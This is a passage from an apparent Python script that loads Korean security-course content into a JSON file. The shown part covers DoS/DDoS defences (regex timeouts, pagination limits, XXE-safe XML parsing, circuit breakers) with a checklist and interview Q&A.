크기 제한\n      max-request-size: 10MB\n*/\n\n// ========================================\n// 3. ReDoS 방어 - 안전한 정규식\n// ========================================\n\n@Service\npublic class SafeValidationService {\n    \n    // 타임아웃이 있는 정규식 매칭\n    public boolean safeMatch(String input, Pattern pattern, long timeoutMs) {\n        ExecutorService executor = Executors.newSingleThreadExecutor();\n        Future<Boolean> future = executor.submit(() -> \n            pattern.matcher(input).matches()\n        );\n        \n        try {\n            return future.get(timeoutMs, TimeUnit.MILLISECONDS);\n        } catch (TimeoutException e) {\n            future.cancel(true);\n            throw new ValidationException(\"Pattern matching timed out\");\n        } catch (Exception e) {\n            throw new ValidationException(\"Pattern matching failed\", e);\n        } finally {\n            executor.shutdownNow();\n        }\n    }\n    \n    // 안전한 이메일 패턴 (백트래킹 최소화)\n    private static final Pattern SAFE_EMAIL_PATTERN = \n        Pattern.compile(\"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\\\.[a-zA-Z]{2,}$\");\n    \n    public boolean validateEmail(String email) {\n        // 길이 제한 먼저 확인\n        if (email == null || email.length() > 254) {\n            return false;\n        }\n        return safeMatch(email, SAFE_EMAIL_PATTERN, 100);  // 100ms 타임아웃\n    }\n}\n\n// ========================================\n// 4. 페이지네이션 강제 및 리소스 제한\n// ========================================\n\n@RestController\n@RequestMapping(\"/api/users\")\npublic class SafeUserController {\n    \n    private static final int MAX_PAGE_SIZE = 100;\n    private static final int DEFAULT_PAGE_SIZE = 20;\n    \n    @GetMapping\n    public Page<UserDto> getUsers(\n            @RequestParam(defaultValue = \"0\") int page,\n            @RequestParam(defaultValue = \"20\") int size) {\n        \n        // 페이지 크기 강제 제한\n        size = Math.min(size, MAX_PAGE_SIZE);\n        \n        Pageable pageable = PageRequest.of(page, size);\n        return userRepository.findAll(pageable)\n            .map(this::toDto);\n    }\n    \n    @GetMapping(\"/search\")\n    public Page<UserDto> searchUsers(\n            @RequestParam String keyword,\n            @RequestParam(defaultValue = \"0\") int page,\n            @RequestParam(defaultValue = \"20\") int size) {\n        \n        // 검색어 길이 제한\n        if (keyword.length() < 2 || keyword.length() > 50) {\n            throw new BadRequestException(\"검색어는 2-50자여야 합니다.\");\n        }\n        \n        size = Math.min(size, MAX_PAGE_SIZE);\n        Pageable pageable = PageRequest.of(page, size);\n        \n        return userRepository.findByNameContaining(keyword, pageable)\n            .map(this::toDto);\n    }\n}\n\n// ========================================\n// 5. XXE 방어 (Billion Laughs 공격 차단)\n// ========================================\n\n@Service\npublic class SafeXmlParser {\n    \n    public Document parseXml(InputStream xmlInput) throws Exception {\n        DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n        \n        // XXE 방어 설정\n        factory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\n        factory.setFeature(\"http://xml.org/sax/features/external-general-entities\", false);\n        factory.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false);\n        factory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n        factory.setXIncludeAware(false);\n        factory.setExpandEntityReferences(false);\n        \n        DocumentBuilder builder = factory.newDocumentBuilder();\n        return builder.parse(xmlInput);\n    }\n}\n\n// ========================================\n// 6. Circuit Breaker 패턴 (Resilience4j)\n// ========================================\n\n@Configuration\npublic class CircuitBreakerConfig {\n    \n    @Bean\n    public CircuitBreaker apiCircuitBreaker() {\n        CircuitBreakerConfig config = CircuitBreakerConfig.custom()\n            .failureRateThreshold(50)           // 50% 실패 시 열림\n            .waitDurationInOpenState(Duration.ofSeconds(30))  // 30초 대기\n            .permittedNumberOfCallsInHalfOpenState(10)  // 반열림 시 10회 테스트\n            .slidingWindowSize(100)             // 최근 100건 기준\n            .build();\n        \n        return CircuitBreaker.of(\"api\", config);\n    }\n}\n\n@Service\npublic class ResilientService {\n    \n    @Autowired\n    private CircuitBreaker circuitBreaker;\n    \n    public String callExternalApi(String endpoint) {\n        return CircuitBreaker.decorateSupplier(circuitBreaker, () -> {\n            // 외부 API 호출\n            return restTemplate.getForObject(endpoint, String.class);\n        }).get();\n    }\n}"
            },
            {
                "type": "tip",
                "title": "실무 체크리스트 & 면접",
                "content": "## DoS/DDoS 방어 체크리스트\n\n### 애플리케이션 레벨\n- [ ] Rate Limiting 구현 (IP별, 사용자별)\n- [ ] 요청 타임아웃 설정 (connection, read, write)\n- [ ] 페이지네이션 강제 (최대 크기 제한)\n- [ ] 파일 업로드 크기 제한\n- [ ] 정규식 타임아웃 설정 (ReDoS 방어)\n- [ ] XML 파싱 시 XXE 방어 설정\n\n### 인프라 레벨\n- [ ] WAF (Web Application Firewall) 설정\n- [ ] CDN 사용 (Cloudflare, AWS CloudFront)\n- [ ] Auto Scaling 구성\n- [ ] 로드 밸런서 Health Check 설정\n- [ ] DDoS 방어 서비스 구독 (AWS Shield, Cloudflare)\n\n### 모니터링\n- [ ] 트래픽 이상 탐지 알람 설정\n- [ ] 응답 시간 모니터링\n- [ ] 에러율 모니터링\n- [ ] CPU/메모리 사용량 알람\n\n---\n\n## 면접 질문\n\n### Junior (신입/주니어)\n\n**Q: DoS와 DDoS의 차이점은 무엇인가요?**\n> A: DoS는 단일 출처에서 공격하고, DDoS는 여러 출처(봇넷)에서 분산 공격합니다. DDoS는 IP 차단만으로 방어가 어렵고, 트래픽 자체가 합법적으로 보일 수 있어 탐지가 더 어렵습니다.\n\n**Q: Rate Limiting은 어떻게 구현하나요?**\n> A: 1) Token Bucket: 버킷에 토큰을 일정 속도로 추가, 요청 시 토큰 소비\n> 2) Sliding Window: 시간 창 내 요청 수 카운트\n> 3) Fixed Window: 고정 시간 간격별 요청 제한\n> Redis나 Bucket4j 같은 라이브러리로 구현합니다.\n\n### Senior (경력)\n\n**Q: Slowloris 공격은 어떻게 탐지하고 방어하나요?**\n> A: 탐지: 동일 IP에서 많은 연결이 오래 유지되면서 데이터 전송률이 낮음\n> 방어: 1) connection-timeout 짧게 설정 (5-10초)\n> 2) 최소 데이터 전송률 요구\n> 3) IP당 동시 연결 수 제한\n> 4) 완성되지 않은 HTTP 요청 타임아웃\n> 5) Nginx/HAProxy에서 req_slow_rate 설정\n\n**Q: Layer 7 DDoS 공격의 특징과 방어 전략은?**\n> A: 특징: 정상 HTTP 요청처럼 보여 기존 방화벽으로 탐지 어려움\n> 방어: 1) WAF에서 요청 패턴 분석\n> 2) JavaScript Challenge (봇 구분)\n> 3) CAPTCHA 적용\n> 4) 행동 기반 분석 (마우스 움직임, 클릭 패턴)\n> 5) ML 기반 이상 탐지\n> 6) Rate limiting + 점진적 차단\n\n---\n\n## 학습 리소스\n\n- **OWASP DoS**: https://owasp.org/www-community/attacks/Denial_of_Service\n- **AWS Shield**: https://aws.amazon.com/shield/\n- **Cloudflare DDoS Protection**: https://www.cloudflare.com/ddos/\n- **Bucket4j Rate Limiting**: https://github.com/bucket4j/bucket4j"
            }
        ]
    }

def main():
    """Main function to update security.json with attack content"""

    json_path = r"c:\tools\codemaster-next-main\codemaster-next-main\codemaster-next-main\src\data\contents\security.json"

    # Read existing JSON
    print("Reading security.json...")
    with open(json_path, 'r', encoding='utf-8') as f:
        data = json.load(f)

    # Prepare new content
    new_contents = {
        "02_공격/csrf": get_csrf_content(),
        "02_공격/csrf-prevent": get_csrf_prevent_content(),
        "02_공격/clickjacking": get_clickjacking_content(),
        "02_공격/ssrf": get_ssrf_content(),
        "02_공격/dos-ddos": get_dos_ddos_content(),
    }

    # Update data
    print("Updating content...")
    for key, content in new_contents.items():
        data[key] = content
        print(f"  - Updated: {key}")

    # Remove csrf-prevention (merged into csrf-prevent)
    if "02_공격/csrf-prevention" in data:
        del data["02_공격/csrf-prevention"]
        print("  - Removed: 02_공격/csrf-prevention (merged into csrf-prevent)")

    # Write back to file
    print("Writing security.json...")
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)

    print("\nDone! Updated topics:")
    print("  1. csrf - CSRF 공격 원리")
    print("  2. csrf-prevent - CSRF 방어 (merged with csrf-prevention)")
    print("  3. clickjacking - 클릭재킹 공격")
    print("  4. ssrf - SSRF 공격")
    print("  5. dos-ddos - DoS/DDoS 공격과 방어")

if __name__ == "__main__":
    main()
